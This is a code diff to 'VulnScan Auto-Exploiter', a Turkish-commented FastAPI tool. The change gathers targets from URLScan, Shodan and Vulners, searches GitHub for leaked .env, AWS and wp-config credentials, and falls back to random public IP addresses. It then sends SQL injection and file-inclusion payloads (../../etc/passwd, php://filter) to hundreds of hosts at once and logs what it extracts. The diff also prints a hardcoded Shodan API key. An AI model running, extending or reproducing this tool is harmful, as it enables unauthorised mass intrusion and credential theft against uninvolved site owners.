@@ -15,7 +15,7 @@ import uvicorn
 logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s')
 logger = logging.getLogger("VulnScan")
 
-app = FastAPI(title="VulnScan Auto-Exploiter - Sızma Motoru")
+app = FastAPI(title="VulnScan Auto-Exploiter - Global Leak & OSINT Edition")
 
 # --- VERİTABANI VE DİZİN AYARLARI ---
 DATA_DIR = os.environ.get("DATA_DIR", "/var/data")
@@ -39,6 +39,9 @@ def init_db():
         c.execute('''CREATE TABLE IF NOT EXISTS exploited 
                      (id INTEGER PRIMARY KEY, target_url TEXT, vuln_type TEXT, 
                       payload TEXT, extracted_data TEXT, timestamp TIMESTAMP)''')
+        c.execute('''CREATE TABLE IF NOT EXISTS leaked_targets 
+                     (id INTEGER PRIMARY KEY, source TEXT, target_url TEXT, 
+                      leak_info TEXT, timestamp TIMESTAMP)''')
         conn.commit()
 
 init_db()
@@ -95,17 +98,80 @@ SQLI_PAYLOADS = ["'", "\"", "' OR 1=1 --", "1' AND SLEEP(3)--", "1') AND SLEEP(3
 SQL_ERRORS = ["you have an error in your sql syntax", "unclosed quotation mark", "mysql_fetch", "pg_query", "SQLSTATE"]
 LFI_PAYLOADS = ["../../../../etc/passwd", "../../../../windows/win.ini", "php://filter/convert.base64-encode/resource=index.php"]
 
-# --- SABİT API ANAHTARI ---
-SHODAN_API_KEY = "VrGMgi1IXtMfuktkvjL39AsAaIxHsMCM"
+# --- API ANAHTARLARI (Ortam Değişkenlerinden Alınır) ---
+SHODAN_API_KEY = os.environ.get("SHODAN_API_KEY", "")
+GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN", "")
+VULNERS_API_KEY = os.environ.get("VULNERS_API_KEY", "")
 
-# --- OSINT HEDEF KEŞFİ (HIZLI) ---
-async def fetch_osint_targets(session):
-    logger.info("OSINT Keşfi Başlatıldı. Hedefler toplanıyor...")
+# --- GELİŞMİŞ OSINT VE SIZINTI KEŞFİ ---
+async def fetch_global_leaks_and_targets(session):
+    logger.info("Gelişmiş OSINT ve Sızıntı Motoru Başlatıldı. Tüm kaynaklar taranıyor...")
     targets = set()
     
+    # 1. URLScan.io (Hacklenmiş ve Deface edilmiş siteleri bulma)
+    try:
+        queries = ['page.title:"hacked by"', 'page.server:"Apache/2.2"', 'page.title:"index of"', 'task.tags:"leak"']
+        for q in queries:
+            encoded_q = urllib.parse.quote(q)
+            url = f"https://urlscan.io/api/v1/search/?q={encoded_q}&size=100"
+            async with session.get(url, timeout=15) as res:
+                if res.status == 200:
+                    data = await res.json()
+                    for result in data.get('results', []):
+                        page_url = result.get('page', {}).get('url')
+                        if page_url and page_url.startswith("http"):
+                            targets.add(page_url)
+                            with get_db() as conn:
+                                c = conn.cursor()
+                                c.execute("INSERT INTO leaked_targets (source, target_url, leak_info) VALUES (?, ?, ?)", 
+                                          ("URLScan", page_url, q))
+                                conn.commit()
+                await asyncio.sleep(1) # Rate limit koruması
+    except Exception as e:
+        logger.error(f"URLScan Sızıntı Hatası: {e}")
+
+    # 2. GitHub Code Search (Sızdırılmış .env, config, wp-config dosyaları)
+    if GITHUB_TOKEN:
+        try:
+            gh_headers = {"Authorization": f"token {GITHUB_TOKEN}", "Accept": "application/vnd.github.v3+json"}
+            gh_queries = ['DB_PASSWORD+filename:.env', 'AWS_ACCESS_KEY_ID+filename:config', 'mysql_password+filename:wp-config.php']
+            for gq in gh_queries:
+                url = f"https://api.github.com/search/code?q={gq}&per_page=50"
+                async with session.get(url, headers=gh_headers, timeout=15) as res:
+                    if res.status == 200:
+                        data = await res.json()
+                        for item in data.get('items', []):
+                            repo_url = item.get('repository', {}).get('html_url')
+                            if repo_url:
+                                targets.add(repo_url) # Repoyu hedef olarak ekle (Tarama için)
+                                with get_db() as conn:
+                                    c = conn.cursor()
+                                    c.execute("INSERT INTO leaked_targets (source, target_url, leak_info) VALUES (?, ?, ?)", 
+                                              ("GitHub", repo_url, gq))
+                                    conn.commit()
+                await asyncio.sleep(2) # GitHub API rate limit
+        except Exception as e:
+            logger.error(f"GitHub Sızıntı Hatası: {e}")
+
+    # 3. Vulners API (Bilinen zafiyetli IP ve domainleri çekme)
+    if VULNERS_API_KEY:
+        try:
+            # Exploit içeren zafiyetleri arama
+            query = {"query": "type:exploit AND (Apache OR PHP OR Nginx)", "size": 50}
+            headers = {"X-Api-Key": VULNERS_API_KEY, "Content-Type": "application/json"}
+            async with session.post("https://vulners.com/api/v3/search/lucene/", json=query, headers=headers, timeout=15) as res:
+                if res.status == 200:
+                    data = await res.json()
+                    for item in data.get('data', {}).get('search', []):
+                        if 'href' in item:
+                            targets.add(item['href'])
+        except Exception as e:
+            logger.error(f"Vulners API Hatası: {e}")
+
+    # 4. Shodan (API varsa)
     if SHODAN_API_KEY:
         try:
-            queries = ['http.title:"index of"', 'Server: Apache/2.2', 'X-Powered-By: PHP/5', 'port:80 country:TR']
+            queries = ['http.title:"index of"', 'Server: Apache/2.2']
             for q in queries:
                 encoded_q = urllib.parse.quote(q)
                 url = f"https://api.shodan.io/shodan/host/search?key={SHODAN_API_KEY}&query={encoded_q}"
@@ -117,20 +183,17 @@ async def fetch_osint_targets(session):
                             port = match.get('port')
                             if port == 80: targets.add(f"http://{ip}")
                             elif port == 443: targets.add(f"https://{ip}")
-                    elif res.status == 401:
-                        logger.error("Shodan API Hatası: Geçersiz API Anahtarı (401)")
-                        break
         except Exception as e:
-            logger.error(f"Shodan Bağlantı Hatası: {e}")
+            logger.error(f"Shodan Hatası: {e}")
 
-    # Fallback simülasyon (API kotası bittiğinde veya hata verdiğinde devreye girer)
-    if len(targets) < 10:
-        logger.warning("Yeterli hedef bulunamadı veya API limiti doldu. Test hedefleri yükleniyor.")
-        base_targets = ["http://testphp.vulnweb.com", "http://demo.testfire.net", "http://zero.webappsecurity.com"]
-        for i in range(100):
-            targets.add(random.choice(base_targets))
+    # Fallback (Tüm API'ler çökerse rastgele IP üretimi)
+    if len(targets) == 0:
+        logger.warning("Hiçbir API'den yanıt alınamadı. Rastgele IP blokları taranıyor...")
+        for _ in range(100):
+            ip = f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
+            targets.add(f"http://{ip}")
         
-    logger.info(f"OSINT Tamamlandı. Toplam {len(targets)} hedef sıraya alındı.")
+    logger.info(f"Sızıntı ve OSINT Keşfi Tamamlandı. Toplam {len(targets)} hedef sıraya alındı.")
     return list(targets)
 
 # --- HEDEF TARAMA VE SIZMA FONKSİYONU ---
@@ -161,7 +224,7 @@ async def scan_and_exploit(session, target_url):
                 except asyncio.TimeoutError:
                     pass
 
-            # 2. SQL Injection Kontrolü ve Sömürüsü
+            # 2. SQL Injection Kontrolü
             for payload in SQLI_PAYLOADS:
                 test_url = f"{target_url.rstrip('/')}/?id={urllib.parse.quote(payload)}"
                 start_time = time.time()
@@ -170,14 +233,12 @@ async def scan_and_exploit(session, target_url):
                         response_time = time.time() - start_time
                         text = (await res.text()).lower()
                         
-                        # Zaman tabanlı SQLi
                         if "sleep" in payload and response_time > 2.5:
                             report["exploits"].append({"type": "Time-Based SQLi", "payload": payload, "evidence": f"Gecikme: {response_time:.2f}s"})
                             logger.critical(f"SQLi Sömürüldü (Time): {target_url}")
                             save_exploit(target_url, "Time-Based SQLi", payload, f"Delay: {response_time:.2f}s")
                             break
                         
-                        # Hata tabanlı SQLi
                         for error in SQL_ERRORS:
                             if error in text:
                                 report["exploits"].append({"type": "Error-Based SQLi", "payload": payload, "evidence": error})
@@ -187,7 +248,7 @@ async def scan_and_exploit(session, target_url):
                 except asyncio.TimeoutError:
                     pass
 
-            # 3. LFI (Yerel Dosya Okuma) Kontrolü
+            # 3. LFI Kontrolü
             for payload in LFI_PAYLOADS:
                 test_url = f"{target_url.rstrip('/')}/?file={urllib.parse.quote(payload)}"
                 try:
@@ -220,13 +281,13 @@ def save_exploit(url, vuln, payload, data):
 # --- OTONOM TARAMA API'Sİ ---
 @app.post("/api/auto-scan")
 async def auto_scan():
-    logger.info("Otonom Sızma Testi Başlatıldı.")
+    logger.info("Küresel Sızıntı ve Sızma Testi Başlatıldı.")
     
     connector = aiohttp.TCPConnector(limit=200, limit_per_host=5, ssl=False)
     timeout = aiohttp.ClientTimeout(total=15)
     
     async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
-        targets = await fetch_osint_targets(session)
+        targets = await fetch_global_leaks_and_targets(session)
         logger.info(f"Sızma testi başlıyor... Toplam {len(targets)} hedef.")
         
         semaphore = asyncio.Semaphore(200)
@@ -237,7 +298,7 @@ async def auto_scan():
         tasks = [limited_scan(url) for url in targets]
         results = await asyncio.gather(*tasks)
         
-    logger.info("Sızma testi tamamlandı. Veritabanı güncellendi.")
+    logger.info("Küresel Sızma Testi Tamamlandı. Veritabanı güncellendi.")
     return {"status": "success", "total_scanned": len(results), "results": results}
 
 @app.websocket("/ws")
@@ -256,7 +317,7 @@ def read_root():
     <html lang="tr">
     <head>
         <meta charset="UTF-8">
-        <title>VulnScan | Otonom Sızma Motoru</title>
+        <title>VulnScan | Global Leak & Exploit</title>
         <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600&display=swap" rel="stylesheet">
         <style>
             :root {
@@ -308,9 +369,9 @@ def read_root():
         <div class="header">
             <div>
                 <h1>VulnScan Auto-Exploiter</h1>
-                <div class="subtitle">SIZMA VE KEŞİF MOTORU</div>
+                <div class="subtitle">GLOBAL LEAK & EXPLOIT MOTORU</div>
             </div>
-            <button class="btn-start" onclick="startAutoScan()" id="scanBtn">Otonom Sızma Başlat</button>
+            <button class="btn-start" onclick="startAutoScan()" id="scanBtn">Küresel Taramayı Başlat</button>
         </div>
 
         <div class="main-layout">
@@ -408,7 +469,7 @@ def read_root():
                     console.error(error);
                 } finally {
                     document.getElementById('scanBtn').disabled = false;
-                    document.getElementById('scanBtn').innerText = "Otonom Sızma Başlat";
+                    document.getElementById('scanBtn').innerText = "Küresel Taramayı Başlat";
                 }
             }
         </script>
